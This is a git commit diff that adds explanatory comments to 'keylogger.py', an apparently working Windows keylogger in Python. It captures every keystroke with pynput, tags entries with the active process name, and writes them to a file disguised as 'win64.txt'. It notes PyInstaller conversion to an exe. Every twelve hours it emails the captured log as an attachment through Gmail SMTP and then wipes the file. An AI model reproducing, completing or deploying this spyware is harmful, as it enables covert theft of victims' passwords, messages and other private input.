2184b7867c9f6190c2135a1ad77cd371b7ec42cb
Janish Suneja <js2629@njit.edu>
2023-09-02 17:41:51 -0400

    Added some documentation

--- keylogger.py
+++ keylogger.py
@@ -1,3 +1,5 @@
+# Imports
+
 from pynput import keyboard
 from email import encoders
 from email.mime.base import MIMEBase
@@ -11,7 +13,12 @@ import psutil
 import os, sys
 import smtplib, ssl
 
+# Global variable to help decide on whether the process has changed or not.
+
 prev_process = ""
+
+# Converts the relative path to an absolute path. Important for converting to an exe via PyInstaller.
+# This is actually a fairly common function in most programs dealing with file paths.
 
 def resource_path(relative_path):
     try:
@@ -20,10 +27,16 @@ def resource_path(relative_path):
         base_path = os.path.abspath(".")
     return os.path.join(base_path, relative_path)
 
+# All this function does is get the first three characters attributed to the current process using win32Process and win32GUI functions.
+
 def get_current_process():
+
+    # Python can unpack sequences. One variable is unused.
     dontcare, pid = win32process.GetWindowThreadProcessId(win32gui.GetForegroundWindow())
     current_process = psutil.Process(pid).name()
     return current_process[0:3]
+
+# This function sets the parameters for going to a new line as our keystrokes stack up OR as our process changes. 
 
 def check_line_integrity():
     global prev_process
@@ -43,6 +56,8 @@ def check_line_integrity():
         file = open(resource_path("win64.txt"), "a")
         file.write("\n" + get_current_process() + "- ")
         file.close()
+
+# The keyboard Listener class's "on_press" function, with a custom implementation with many parameters.
 
 def on_press(key):
     check_line_integrity()
@@ -68,20 +83,31 @@ def on_press(key):
         file.write("<FN>")
     file.close()
 
+# Create a new listener.
+
 listener = keyboard.Listener(
     on_press = on_press
 )
 
+# The "clear" function accomplishes 2 things:
+    # 1. After half a day, it will erase all content from the text file.
+    # 2. It will take the erased content and send it over to an email of your choosing. 
+        # It does this through "app passwords" in the case of gmail.
+
 def clear():
     while(True):
-        sleep(10.0)
+        sleep(43200.0)
         f = "win64.txt"
+
+        # Sender and receiver are same for simplicity.
         email_sender = "YOUR_EMAIL_HERE@gmail.com"
         email_receiver = "YOUR_EMAIL_HERE@gmail.com"
         password = "APP_PASSWORD_HERE"
         subject = "SUBJECT"
         body= """\
                 LOREMIPSUM"""
+        
+        # Port 587 is chosen for TLS encryption.
         port = 587
         
         message = MIMEMultipart()
@@ -91,6 +117,8 @@ def clear():
 
         partTxt = MIMEText(body, "plain")
         message.attach(partTxt)
+
+        # Attaching text file and sending.
 
         with open(resource_path(f), 'rb+') as attachment:
             partFile = MIMEBase("application", "octet-stream")
